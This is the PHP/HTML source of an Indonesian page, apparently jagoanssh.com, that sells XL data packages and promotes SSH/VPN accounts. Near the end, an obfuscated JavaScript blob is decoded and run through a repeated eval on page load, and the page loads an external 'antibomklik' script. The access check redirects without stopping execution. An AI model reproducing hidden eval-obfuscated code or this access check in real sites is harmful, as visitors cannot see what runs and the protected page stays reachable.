<?php 
include_once 'tembak.php';

if (empty($_SESSION['session'])){
    Header("Location:Login.php");
    session_destroy();
}
if ($_SESSION['indexx'] != 00){
    Header("Location:Login.php");
    $_SESSION['session'] = '';
    session_destroy();
}
?>
<!DOCTYPE html>
 
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="theme-color" content="#6078ea">
	<meta name="msapplication-navbutton-color" content="#6078ea">
	<meta name="apple-mobile-web-app-status-bar-style" content="#6078ea">
    <title>Tembak Paket Data XL - Jagoanssh</title>
     <meta name="description" content="JAGOANSSH - Paket Data XL Murah"/>
    <meta name="keywords" content="Jagoanssh, jagoanssh, jagoanssh.com, jagoan, jagossh, jagossh.com, Jagoanssh.com, Jagonyassh, Web SSH, Website SSH, Premium VPN, Premium SSH, SSH SSL/TLS, SSL/TLS, Badvpn, Udpgw, SSH Video Call, SSH Game Online, SSH Indonesia ,SSH Server SGGS, SSH Free, Free SSH Account 1 Month, 30 Days SSH Account, SSH Premium, VPN Premium, Tunneling Account, Dropbear, OpenSSH,Paket Data XL, Tembak XL, Paket Internet, Internet murah, Telkomsel, Axis, Tembak Paket XL, Tembak Data, Tembak Telkomsel, Tembak Paket Data Tsel, Tembak Kuota XL, Tembak Data Murah, Tembak Kuota Murah, Indosat, Smartfren, Paket data murah, Free Premium VPN">
	<meta name="google-site-verification" content="vhYyF0q_9LSeZtClRFcSLJ7M-FDrEu-DpPZIPS69WbY" />
	<link rel="icon" href="https://jagoanssh.com/favicon.png">
	
<!-- Google Analytics -->
<script>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

      ga('create', 'UA-120286388-2', 'auto');
      ga('send', 'pageview');
</script>
   <!-- End Google Analytics -->
    
    <link href="https://fonts.googleapis.com/css?family=Rubik:300,400,500" rel="stylesheet"> 
    <link rel="stylesheet" href="scss/css/styles-merged.css">
    <link rel="stylesheet" href="scss/css/style.min.css">
    <script src="/assets/js/jquery.min.js"></script>
    
<script>
$(document).ready(function(){

        $("#beli").click(function(event){
            event.preventDefault();
            var reg =jQuery('select[name="reg"]').val(),
                manual=jQuery('input[name="manual"]').val();
            $.ajax({
                type:'POST',
                url:'tembak.php',
                data:{
                    reg:reg,manual:manual
                },
                error:function(xhr,ajaxOptions,thrownError){
                    $('#response').html(xhr);
                },
                cache:false,
                beforeSend:function(){
                    $(".form-control").attr("disabled", true);
                    $('#response').html('Silahkan Tunggu....');

                },
                success:function(s){
                    $(".form-control").attr("disabled", false);
                    $('#response').html(s);
                }
            });
            return false;
    });
    $("#subid").click(function(event){
            $.ajax({
                type:'POST',
                url:'subid.php',
                error:function(xhr,ajaxOptions,thrownError){
                    $('#response').html(xhr);
                },
                cache:false,
                beforeSend:function(){
                    $(".form-control").attr("disabled", true);
                    $('#response').html('Silahkan Tunggu....');

                },
                success:function(s){
                    $(".form-control").attr("disabled", false);
                    $('#response').html(s);
                }
            });
            return false;
        });
    });
</script>

<!--[if lt IE 9]>
      <script src="js/vendor/html5shiv.min.js"></script>
      <script src="js/vendor/respond.min.js"></script>
    <![endif]-->
<?php
include('ads/auto.php');
?>
  </head>
  <body>
  <!-- START: header -->
  <header role="banner" class="probootstrap-header"><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <div class="container-fluid">
      <!-- <div class="row"> -->
        <a href="/" class="probootstrap-logo">Jagoanssh.com</a>
        
        <a href="#" class="probootstrap-intro probootstrap-burger-menu visible-xs" ><i></i></a>
        <div class="mobile-menu-overlay"></div>

        <nav role="navigation" class="probootstrap-nav hidden-xs">
          <ul class="probootstrap-main-nav">
            <li><a href="/">Home</a></li>
            <li class="dropdown">
             <a href="/" class="dropdown-toggle" data-toggle="dropdown">SSH Server <b class="caret"></b></a>
             <ul class="dropdown-menu">
             <li><a href="/?do=ssh-servers"><font color="black">SSH 3 Days</font></a></li>
             <li><a href="/?do=ssh-servers/extra"><font color="black">SSH 7 Days</font></a></li>
             <li><a href="/?do=ssh-servers/one-month"><font color="black">SSH VIP</font></a></li>
             <li><a href="/?do=shadowsocks"><font color="black">Shadowsocks</font></a></li>
             </ul>
             </li>
            <li><a href="/?do=vpn-servers">VPN Server</a></li>
            <li class="dropdown">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown">Tools <b class="caret"></b></a>
            <ul class="dropdown-menu">
            <li><a href="/?do=squid"><font color="black">Squid Proxy</font></a></li>
            <li><a href="/?do=ssh-lifetime"><font color="black">SSH Lifetime</font></a></li>
            <li><a href="/?do=server-status"><font color="black">Server Status</font></a></li>
            <li><a href="/?do=whatismyip"><font color="black">My IP</font></a></li>
            <li><a href="https://linkconfig.com"><font color="black">LinkConfig</font></a></li>
            </ul>
            </li>
            <li class="dropdown">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown">Paket Data <b class="caret"></b></a>
            <ul class="dropdown-menu">
            <li><a href="/?do=axis"><font color="black">AXIS</font></a></li>
            <li><a href="/?do=indosat"><font color="black">INDOSAT</font></a></li>
            <li><a href="/?do=xl"><font color="black">XL</font></a></li>
            <li><a href="/?do=telkom"><font color="black">Tsel</font></a></li>
            </ul>
            </li>
            <li class="probootstrap-cta"><a href="#"><i class="icon-back-in-time"></i> at 22:00 GMT+7</a></li>
          </ul>
          <div class="extra-text visible-xs">
            <a href="#" class="probootstrap-burger-menu"><i></i></a>
            <h5>Follow</h5>
            <ul class="social-buttons">
              <li><a href="#"><i class="icon-twitter"></i></a></li>
              <li><a href="https://facebook.com/jagoanssh"><i class="icon-facebook"></i></a></li>
              <li><a href="#"><i class="icon-instagram2"></i></a></li>
            </ul>
            <p><small>&copy; Jagoanssh.com Copyright 2019. All Rights Reserved.</small></p>
          </div>
        </nav>

        <section class="probootstrap-intro">
          <div class="container">
            <div class="row">
              <div class="col-md-8 col-md-offset-2">
                <h1 class="probootstrap-animate">JAGOANSSH GIVES THE BEST SERVICE FOR YOU</h1>
                <div class="probootstrap-subtitle probootstrap-animate">
                  <h2>Create your account now for free</h2>
                </div>
              </div>
            </div>
          </div>
        </section>
        
  </header>
  <!-- END: header -->
  <!-- START: section -->
  <section class="probootstrap-section probootstrap-feature-first">
    <div class="container">
      <div class="row" style="margin-top: -120px;">
        <div class="col-md-4 probootstrap-animate">
          <div class="probootstrap-box">
              <div class="icon"><i class="icon-lock3"></i></div>
              <h3>Privacy & Security</h3>
              <p>Get your identity hidden online, your IP Address will be masked with our server IP. Also your connection will be encrypted.</p>
          </div>
        </div>
        <div class="col-md-4 probootstrap-animate">
          <div class="probootstrap-box">
              <div class="icon"><i class="icon-shield3"></i></div>
              <h3>Bypass Cencorship</h3>
              <p>Bypass your school, government or your office internet cencorship. Unblock any site and enjoy Internet Freedom.</p>
          </div>
        </div>
        <div class="col-md-4 probootstrap-animate">
          <div class="probootstrap-box">
              <div class="icon"><i class="icon-speedometer"></i></div>
              <h3>Boost Internet Speed</h3>
              <p>Our service may boost your internet speed and make your connection stable (stable PING). This differ by country.</p>
          </div>
        </div>
      </div>
<?php
include('ads/ads.php');
?>
  </section>
  <!-- END: section -->
  
<!-- START: section -->
  <section class="probootstrap-section probootstrap-section-colored">
    <div class="container">
      <div class="row">
        <div class="col-md-8 col-md-offset-2 section-heading mb50 text-center probootstrap-animate">
          <h2>Kenapa Harus Tembak Paket?</h2>
          <p class="lead">Beberapa keuntungan dengan membeli paket data di website ini</p>
        </div>
      </div>
      <div class="row">
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-wallet"></i> <span>Harga Lebih Murah</span></h3>
          <p>Harga lebih murah dan kami menyediakan banyak pilihan paket diskon</p>
        </div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-credit-card"></i> <span>System Pembayaran</span></h3>
          <p>Semua pembelian paket data langsung memotong pulsa dari pengguna</p>
        </div>
        <div class="clearfix visible-sm-block"></div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-key"></i> <span>System Keamanan</span></h3>
          <p>Website ini tidak pernah menyimpan semua data pengguna yang melakukan pembelian paket data</p>
        </div>
        <div class="clearfix visible-md-block"></div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-checkmark"></i> <span>Pembelian Legal</span></h3>
          <p>Semua pembelian paket data di jamin legal karena langsung di beli dari pihak XL</p>
        </div>
        <div class="clearfix visible-sm-block"></div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-hour-glass2"></i> <span>Beli Kapan Saja</span></h3>
          <p>Anda bisa membeli paket data kapan saja selama system kami online</p>
        </div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-users2"></i> <span>Kirim Paket</span></h3>
          <p>Anda bisa membeli paket data untuk teman atau pun keluarga anda</p>
        </div>
        <div class="clearfix visible-sm-block"></div>
      </div>
    </div>
   </div>
  </section>
  <!-- END: section -->
<?php
include('ads/link.php');
?>
<section class="probootstrap-section">
    <div class="container">
    <div class="row">
    <div class="col-md-6 col-md-offset-3 probootstrap-animate">
    <div class="alert alert-danger" role="alert">NEW: Bonus internet 1GB, GRATIS pilih menu XTRA VIP</div>
    <form method="post" class="probootstrap-form probootstrap-box">
    <center>
<div class="icon"><i class="icon-checkbox-checked"></i></div>
<h1>Pilih Paket Data</h1></center>
    <form method="post">
        <div class="form-group">
            <label>Service ID (jika tidak punya biarkan kosong)</label>
            <input type="number" class="form-control" id="inputmanual" name="manual" placeholder=" ex:8210012">
        </div>
        <?php
        (isset($_POST["anuID"])) ? $anuID = $_POST["anuID"] : $anuID=1;
        ?>
        <div class="form-group">
			<label>Pilih paket default</label>
			<select class="form-control" name="reg">
				<option <?php if ($anuID == 1 ) echo 'selected' ; ?> value="1">XTRA Kuota 30GB, 30hr, Rp11.900</option>
				<option <?php if ($anuID == 22 ) echo 'selected' ; ?> value="22">XTRA Kuota Waze 10 GB 30hr, Rp10rb</option>
				<option <?php if ($anuID == 25 ) echo 'selected' ; ?> value="25">XTRA Kuota Midnight 5GB, 30hr, Rp10rb</option>
				<option <?php if ($anuID == 26 ) echo 'selected' ; ?> value="26">XTRA Kuota Youtube 2GB, 30hr, Rp10rb</option>
				<option <?php if ($anuID == 27 ) echo 'selected' ; ?> value="27">XTRA Kuota Facebook 2GB, 30hr, Rp10rb</option>
				<option <?php if ($anuID == 28 ) echo 'selected' ; ?> value="28">XTRA Kuota Joox 10GB, 30hr, Rp10rb</option>
				<option <?php if ($anuID == 29 ) echo 'selected' ; ?> value="29">XTRA Kuota Mobile Legends 10GB, 30hr, Rp10rb</option>
                <!---<option <?php if ($anuID == 3 ) echo 'selected' ; ?> value="3">Nelp ke Semua Operator 300Mnt, 90hr, Rp100rb</option>--->
                <!---<option <?php if ($anuID == 4 ) echo 'selected' ; ?> value="4">Nelp ke Semua Operator 500Mnt, 30hr, Rp140rb</option>--->
                <!---<option <?php if ($anuID == 5 ) echo 'selected' ; ?> value="5">Nelp ke Semua Operator 500Mnt, 90hr, Rp150rb</option>--->
                <!---<option <?php if ($anuID == 6 ) echo 'selected' ; ?> value="6">XTRA Bicara Harian, 1hr, Rp5rb</option>--->
                <!---<option <?php if ($anuID == 7 ) echo 'selected' ; ?> value="7">XTRA Bicara Mingguan, 7hr, Rp15rb</option>--->
                <!---<option <?php if ($anuID == 8 ) echo 'selected' ; ?> value="8">XTRA Bicara Bulanan, 30hr, Rp30rb</option>--->
                <!---<option <?php if ($anuID == 9 ) echo 'selected' ; ?> value="9">HotRod PRIMA 1.2GB, 30hr, Rp50rb</option>--->
                <!---<option <?php if ($anuID == 10 ) echo 'selected' ; ?> value="10">HotRod PRIMA 4GB, 30hr, Rp100rb</option>--->
                <!---<option <?php if ($anuID == 11 ) echo 'selected' ; ?> value="11">HotRod PRIMA 10GB, 30hr, Rp200rb</option>--->
                <!---<option <?php if ($anuID == 12 ) echo 'selected' ; ?> value="12">HotRod 30 Hari 1.5GB, 30hr, Rp25rb</option>--->
                <!---<option <?php if ($anuID == 13 ) echo 'selected' ; ?> value="13">HotRod 30 Hari 3GB, 30hr, Rp30rb</option>
                <!---<option <?php if ($anuID == 14 ) echo 'selected' ; ?> value="14">HotRod 30 Hari 6GB, 30hr, Rp50rb</option>--->
                
                <!---<option <?php if ($anuID == 15 ) echo 'selected' ; ?> value="15">Combo Lite 3GB, 30hr, Rp19.900</option>--->
                <!---<option <?php if ($anuID == 16 ) echo 'selected' ; ?> value="16">Combo Lite 5GB, 30hr, Rp29.900</option>--->
                <!---<option<?php if ($anuID == 17 ) echo 'selected' ; ?> value="17">Combo Lite 9GB, 30hr, Rp49.900</option>--->
                <!---<option <?php if ($anuID == 18 ) echo 'selected' ; ?> value="18">Combo Lite 17GB, 30hr, Rp79.900</option>--->
              <!--- <option <?php if ($anuID == 19 ) echo 'selected' ; ?> value="19">Combo Lite 25GB, 30hr, Rp99.900</option>--->
                <!---<option <?php if ($anuID == 20 ) echo 'selected' ; ?> value="20">Super Seru, 30hr, Rp15rb</option>--->
                <option <?php if ($anuID == 30 ) echo 'selected' ; ?> value="30">Waze&Chat 1 hr, Rp.500</option>
                <option <?php if ($anuID == 23 ) echo 'selected' ; ?> value="23">Waze&Chat 3 hr, Rp.1000</option>
             <option <?php if ($anuID == 24 ) echo 'selected' ; ?> value="24">Waze&Chat 7hr, Rp2500</option>
             <option <?php if ($anuID == 31 ) echo 'selected' ; ?> value="31">Xtra Rejeki 7hr, Rp10.000</option>
             <option <?php if ($anuID == 32 ) echo 'selected' ; ?> value="32">Xtra Rejeki 14hr, Rp20.000</option>
             <option <?php if ($anuID == 33 ) echo 'selected' ; ?> value="33">Xtra Rejeki 30hr, Rp65.000</option>
             <option <?php if ($anuID == 34 ) echo 'selected' ; ?> value="34">Unlimited FB&Chat 1hr sahur, Rp. 500</option>
             <option <?php if ($anuID == 35 ) echo 'selected' ; ?> value="35">Unlimited FB&Chat 3hr sahur, Rp. 1000</option>
             <option <?php if ($anuID == 36 ) echo 'selected' ; ?> value="36">Unlimited FB&Chat 7hr sahur, Rp. 2500</option>
             <option <?php if ($anuID == 37 ) echo 'selected' ; ?> value="37">Unlimited FB&Chat 1hr ngabuburit, Rp. 500</option>
             <option <?php if ($anuID == 38 ) echo 'selected' ; ?> value="38">Unlimited FB&Chat 3hr ngabuburit, Rp. 1000</option>
             <option <?php if ($anuID == 39 ) echo 'selected' ; ?> value="39">Unlimited FB&Chat 7hr ngabuburit, Rp. 2500</option>
             <option <?php if ($anuID == 48 ) echo 'selected' ; ?> value="48">Zero JOOX 500mb 10 hari, Rp. 0</option>
             <option <?php if ($anuID == 49 ) echo 'selected' ; ?> value="49">Zero AOV 500mb 10 hari, Rp.0</option>
             <option <?php if ($anuID == 50 ) echo 'selected' ; ?> value="50">Zero Smule 500mb 10 hari, Rp0</option>
             <option <?php if ($anuID == 51 ) echo 'selected' ; ?> value="51">Zero Google Duo 50mb 1 hari, Rp.0</option>
             <option <?php if ($anuID == 52 ) echo 'selected' ; ?> value="52">Zero tokopedia 50mb 1 hari, Rp.0</option>
             <!---<option <?php if ($anuID == 40 ) echo 'selected' ; ?> value="40">VIP CLUB Joox 10GB, 30hr, Rp. 1000</option>--->
             <!---<option <?php if ($anuID == 41 ) echo 'selected' ; ?> value="41">VIP CLUB Facebook 2GB, 30hr, Rp. 1000</option>
             <option <?php if ($anuID == 42 ) echo 'selected' ; ?> value="42">VIP CLUB iFlix 5GB, 30hr, Rp. 1000</option>
             <option <?php if ($anuID == 43 ) echo 'selected' ; ?> value="43">VIP CLUB Instagram 2GB, 30hr, Rp. 1000</option>
             <option <?php if ($anuID == 44 ) echo 'selected' ; ?> value="44">VIP CLUB Mobile Legends 10GB, 30hr, Rp. 1000</option>
             <option <?php if ($anuID == 45 ) echo 'selected' ; ?> value="45">VIP CLUB Waze 10GB, 30hr, Rp. 1000</option>
             <option <?php if ($anuID == 46 ) echo 'selected' ; ?> value="46">VIP CLUB Youtube 2GB, 30hr, Rp. 1000</option>
             <option <?php if ($anuID == 47 ) echo 'selected' ; ?> value="47">VIP CLUB Midnight 5GB, 30hr, Rp. 1000</option>--->
                <!---<option <?php if ($anuID == 2 ) echo 'selected' ; ?> value="2">Pkt XTRA Combo 5GB + 5GB, 30hr, Rp59000</option>--->
			</select>
		</div>
		<div align="center">
        <p><button class="btn btn-danger" input type="button" onclick="window.location = 'clear.php';"> Keluar</button></p>
        <p><button class="btn btn-warning" input type="button" onclick="window.location = 'biz.php';" >PAKET BIZ</button></p>
        <p><button class="btn btn-info" input type="button" onclick="window.location = 'xtravip.php';" >XTRA COMBO VIP</button></p>
        <button class="btn btn-primary btn-block" input type="submit" id="beli" name="beli">Beli Paket</button>
        <button class="btn btn-primary btn-block" input type="submit" id="subid" name="beli">Beli Paket</button>
        <p><div class="btn-primary" id="response"></div></p>
<?php
include('ads/ads.php');
?>
<div id="count">
</form>
</div>
</div>
</div>
</section>

<style>#g207{position:fixed!important;position:absolute;top:0;top:expression
        ((t=document.documentElement.scrollTop?document.documentElement.scrollTop:document
        .body.scrollTop)+"px");
        left:0;width:100%;height:100%;background-color:#fff;opacity:0.9;filter:alpha(opacity=90);display:block}#g207 p{opacity:1;filter:none;font:bold 16px Verdana,Arial,sans-serif;text-align:center;margin:20% 0}#g207 p a,#g207 p i{font-size:12px}#g207 ~ *{display:none}</style><noscript><i id=g207><p>Welcome To JAGOANSSH.COM<br />Get Your Account SSH / VPN Premium<br />High Speed<br />Creat Now<br /><a href="http://antiblock.org/">antiblock.org</a></p></i></noscript><script>(function(w,u){var d=w.document,z=typeof u;function g207(){function c(c,i){var e=d.createElement('i'),b=d.body,s=b.style,l=b.childNodes.length;if(typeof i!=z){e.setAttribute('id',i);s.margin=s.padding=0;s.height='100%';l=Math.floor(Math.random()*l)+1}e.innerHTML=c;b.insertBefore(e,b.childNodes[l-1])}function g(i,t){return !t?d.getElementById(i):d.getElementsByTagName(t)};function f(v){if(!g('g207')){c('<p><font color="blue">PESAN DARI ADMIN JAGOSSH.COM</font><br/><font color="red">Mohon matikan ads block di browser anda agar suport dengan website ini.... </font><p>Please disable your ad blocker!<br/>This site is supported by the advertisement <br/>Please disable your ad blocker to support us!!! </p>','g207')}};(function(){var a=['Adrectangle','PageLeaderAd','ad-column','advertising2','divAdBox','mochila-column-right-ad-300x250-1','searchAdSenseBox','ad','ads','adsense'],l=a.length,i,s='',e;for(i=0;i<l;i++){if(!g(a[i])){s+='<a id="'+a[i]+'"></a>'}}c(s);l=a.length;for(i=0;i<l;i++){e=g(a[i]);if(e.offsetParent==null||(w.getComputedStyle?d.defaultView.getComputedStyle(e,null).getPropertyValue('display'):e.currentStyle.display
        )=='none'){return f('#'+a[i])}}}());(function(){var t=g(0,'img'),a=['/adaffiliate_','/adops/ad','/adsales/ad','/adsby.','/adtest.','/ajax/ads/ad','/controller/ads/ad','/pageads/ad','/weather/ads/ad','-728x90-'],i;if(typeof t[0]!=z&&typeof t[0].src!=z){i=new Image();i.onload=function(){this.onload=z;this.onerror=function(){f(this.src)};this.src=t[0].src+'#'+a.join('')};i.src=t[0].src}}());(function(){var o={'http://pagead2.googlesyndication.com/pagead/show_ads.js':'google_ad_client','http://js.adscale.de/getads.js':'adscale_slot_id','http://get.mirando.de/mirando.js':'adPlaceId'},S=g(0,'script'),l=S.length-1,n,r,i,v,s;d.write=null;for(i=l;i>=0;--i){s=S[i];if(typeof o[s.src]!=z){n=d.createElement('script');n.type='text/javascript';n.src=s.src;v=o[s.src];w[v]=u;r=S[0];n.onload=n.onreadystatechange=function(){if(typeof w[v]==z&&(!this.readyState||this.readyState==="loaded"||this.readyState==="complete")){n.onload=n.onreadystatechange=null;r.parentNode.removeChild(n);w[v]=null}};r.parentNode.insertBefore(n,r);setTimeout(function(){if(w[v]!==null){f(n.src)}},2000);break}}}())}if(d.addEventListener){w.addEventListener('load',g207,false)}else{w.attachEvent('onload',g207)}})(window);</script>

<script src="//ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
<script src="//yourjavascript.com/4682124575/antibomklik.js"/></script>        

<!-- START: section -->
  <section class="probootstrap-section">
    <div class="container">
      <div class="row">
        <div class="col-md-8 col-md-offset-2 section-heading mb50 text-center probootstrap-animate">
          <h2>Benefits of using SSH/VPN</h2>
          <p class="lead">Here are some advantages of using SSH or VPN.</p>
        </div>
      </div>
<?php
include('ads/ads.php');
?>
      <div class="row">
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
            <div class="probootstrap-box">
          <h3 class="mb30">In secret (confidentiality)</h3>
          <p>By using a public network that controls data, SSH / VPN technology uses a work system by encrypting all data that passes through it.</p>
          <p>With the encryption technology, data confidentiality can be more controlled.</p>
          <p>Although there are parties who can tap data that passes over the internet in addition to the SSH / VPN line itself, but not necessarily able to read the data, because the data has been scrambled.</p>
          <p>By implementing this encryption system, no one can access and read the data network contents easily.</p>
        </div>
        </div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
        <div class="probootstrap-box">
          <h3 class="mb30">Integrity Data (Data Integrity)</h3>
          <p>When passing through the internet network, the data actually runs very far past various countries.</p>
          <p>During the trip, various disturbances could occur in its contents, lost, damaged, manipulated by people who could not be moved.</p>
          <p>In SSH / VPN technology is needed that can maintain the integrity of the data starting from the data sent until the data reaches the destination.</p>
        </div>
        </div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
        <div class="probootstrap-box">
          <h3 class="mb30">Source Authentication (Authentication Origin)</h3>
          <p>SSH / VPN technology has the ability to authenticate sending data sources to be received. SSH / VPN will check all incoming data and retrieve information from the data source.</p>
          <p>Then, the address of the data source will be successfully completed, the authentication process was successful.</p>
          <p>Thus, SSH / VPN guarantees all data sent and received from the source received. No data is falsified or sent by other parties.</p>
        </div>
      </div>
    </div>
  </section>
  <!-- END: section -->
  
  <!-- START: footer -->
  <footer role="contentinfo" class="probootstrap-footer">
    <div class="container">
      <div class="row mt40">
        <div class="col-md-12 text-center">
          <ul class="probootstrap-footer-social">
            <li><a href="#"><i class="icon-twitter"></i></a></li>
            <li><a href="https://facebook.com/jagoanssh"><i class="icon-facebook"></i></a></li>
            <li><a href="#"><i class="icon-instagram2"></i></a></li>
          </ul>
          <a href="/?do=terms">Terms & Condition</a> | <a href="/?do=privacy">Privacy Policy</a>
          <p>
            <small>&copy; 2019 <a href="https://jagoanssh.com/" target="_blank">Jagoanssh.com</a>. All Rights Reserved.</small>
          </p>
          
        </div>
      </div>
    </div>
  </footer>
  <!-- END: footer -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script type="text/javascript">
//<![CDATA[
<!--
var x="function f(x){var i,o=\"\",l=x.length;for(i=l-1;i>=0;i--) {try{o+=x.c" +
"harAt(i);}catch(e){}}return o;}f(\")\\\"function f(x,y){var i,o=\\\"\\\\\\\""+
"\\\\,l=x.length;for(i=0;i<l;i++){if(i<88)y++;y%=127;o+=String.fromCharCode(" +
"x.charCodeAt(i)^(y++));}return o;}f(\\\"\\\\=4>*\\\\\\\\014\\\\\\\\006\\\\\\"+
"\\013\\\\\\\\023G\\\\\\\\034\\\\\\\\037\\\\\\\\006\\\\\\\\005\\\\\\\\026\\\\"+
"\\\\031\\\\\\\\031QYAsavox~,}bq)J:i\\\\\\\\177mS\\\\\\\\rNU\\\\\\\\007YO\\\\"+
"\\\\\\\\\\\\YB@E\\\\\\\\026WUPn(7\\\\\\\\032jtpa#1&?(.b\\\\\\\\002\\\\\\\\0" +
"22>\\\\\\\\nFHJLR\\\\\\\\003\\\\\\\\021\\\\\\\\006\\\\\\\\037\\\\\\\\010\\\\"+
"\\\\016\\\\\\\\\\\\\\\\\\\\\\\\rs`8[+yh\\\\\\\\177~!ec>\\\\\\\\177r}{8zqw4q" +
"oA<!\\\\\\\\034\\\\\\\\016Q@VLVS\\\\\\\\026uXwB\\\\\\\\r\\\\\\\\016\\\\\\\\" +
"017\\\\\\\\020\\\\\\\\rAPF\\\\\\\\\\\\\\\\FC\\\\\\\\030JHX\\\\\\\\001a\\\\\\"+
"\\034^32'77j,4g#;>)?7a6> >z8?9v3)\\\\\\\\007~cbp\\\\\\\\023\\\\\\\\002\\\\\\"+
"\\020\\\\\\\\n\\\\\\\\024\\\\\\\\021X;\\\\\\\\0325\\\\\\\\004KLMNS\\\\\\\\0" +
"03\\\\\\\\022\\\\\\\\000\\\\\\\\032\\\\\\\\004\\\\\\\\001V\\\\\\\\004\\\\\\" +
"\\n\\\\\\\\032G'^\\\\\\\\034\\\\\\\\rsdvp+ou(iyz%ad`!zbN1*)9d{kskh#<6\\\\\\" +
"\\033\\\\\\\\021\\\\\\\\031\\\"\\\\,88)\\\"(f};)lo,0(rtsbus.o nruter};)i(tA" +
"rahc.x=+o{)--i;0=>i;1-l=i(rof}}{)e(hctac};l=+l;x=+x{yrt{)711=!)31/l(tAedoCr" +
"ahc.x(elihw;lo=l,htgnel.x=lo,\\\"\\\"=o,i rav{)x(f noitcnuf\")"              ;
while(x=eval(x));
//-->
//]]>
</script>
  
  </body>
</html>